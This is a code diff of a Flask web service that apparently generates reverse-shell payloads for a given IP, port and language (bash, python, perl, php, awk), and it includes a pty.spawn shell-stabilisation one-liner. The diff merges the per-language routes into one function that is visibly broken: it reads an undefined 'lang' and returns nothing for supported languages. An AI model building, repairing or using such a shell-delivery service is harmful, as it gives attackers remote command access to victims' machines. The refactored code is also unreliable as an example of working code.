@@ -1,4 +1,4 @@
-from flask import render_template, Blueprint, request
+from flask import render_template, Blueprint, request, url_for, redirect
 from .validate_and_generate import payload_generator, valid_ip, valid_port
 
 # Returns payload.
@@ -30,39 +30,57 @@ def stabilize():
 	py_stabilise_payload = 'pty=__import__(\"pty\");pty.spawn("/bin/bash")'
 	return f"python -c '{py_stabilise_payload}'\n"
 
-# Bash route.
+## Language Routes.
+### Bash route.
 @index.route('<string:ip>/<int:port>', methods=['GET'])
-@index.route('bash/<string:ip>/<int:port>', methods=['GET'])
-def bash(ip, port):
-	quotes_pref = request.args.get("q", str)
-	shell_pref = request.args.get("s", str)
-	return ret_payload(ip, port, "bash", quotes_pref, shell_pref)
+@index.route('<string:lang>/<string:ip>/<int:port>', methods=['GET'])
+def lang(ip, port):
+	supported_langs = ["bash", "python", "perl", "php", "awk"]
 
-# Python route.
-@index.route('python/<string:ip>/<int:port>', methods=['GET'])
-@index.route('python3/<string:ip>/<int:port>', methods=['GET'])
-def python(ip, port):
 	quotes_pref = request.args.get("q", str)
 	shell_pref = request.args.get("s", str)
-	return ret_payload(ip, port, "python", quotes_pref, shell_pref)
 
-# Perl route.
-@index.route('perl/<string:ip>/<int:port>', methods=['GET'])
-def perl(ip, port):
-	quotes_pref = request.args.get("q", str)
-	shell_pref = request.args.get("s", str)
-	return ret_payload(ip, port, "perl", quotes_pref, shell_pref)
+	if lang is None:
+		return ret_payload(ip, port, "bash", quotes_pref, shell_pref)
 
-# PHP route.
-@index.route('php/<string:ip>/<int:port>', methods=['GET'])
-def php(ip, port):
-	quotes_pref = request.args.get("q", str)
-	shell_pref = request.args.get("s", str)
-	return ret_payload(ip, port, "php", quotes_pref, shell_pref)
+	if lang not in supported_langs:
+		return redirect(url_for('.help'))
 
-# Awk route.
-@index.route('awk/<string:ip>/<int:port>', methods=['GET'])
-def awk(ip, port):
-	quotes_pref = request.args.get("q", str)
-	shell_pref = request.args.get("s", str)
-	return ret_payload(ip, port, "awk", quotes_pref, shell_pref)
+		
+
+## Bash route.
+#@index.route('<string:ip>/<int:port>', methods=['GET'])
+#@index.route('bash/<string:ip>/<int:port>', methods=['GET'])
+#def bash(ip, port):
+#	quotes_pref = request.args.get("q", str)
+#	shell_pref = request.args.get("s", str)
+#	return ret_payload(ip, port, "bash", quotes_pref, shell_pref)
+#
+## Python route.
+#@index.route('python/<string:ip>/<int:port>', methods=['GET'])
+#@index.route('python3/<string:ip>/<int:port>', methods=['GET'])
+#def python(ip, port):
+#	quotes_pref = request.args.get("q", str)
+#	shell_pref = request.args.get("s", str)
+#	return ret_payload(ip, port, "python", quotes_pref, shell_pref)
+#
+## Perl route.
+#@index.route('perl/<string:ip>/<int:port>', methods=['GET'])
+#def perl(ip, port):
+#	quotes_pref = request.args.get("q", str)
+#	shell_pref = request.args.get("s", str)
+#	return ret_payload(ip, port, "perl", quotes_pref, shell_pref)
+#
+## PHP route.
+#@index.route('php/<string:ip>/<int:port>', methods=['GET'])
+#def php(ip, port):
+#	quotes_pref = request.args.get("q", str)
+#	shell_pref = request.args.get("s", str)
+#	return ret_payload(ip, port, "php", quotes_pref, shell_pref)
+#
+## Awk route.
+#@index.route('awk/<string:ip>/<int:port>', methods=['GET'])
+#def awk(ip, port):
+#	quotes_pref = request.args.get("q", str)
+#	shell_pref = request.args.get("s", str)
+#	return ret_payload(ip, port, "awk", quotes_pref, shell_pref)
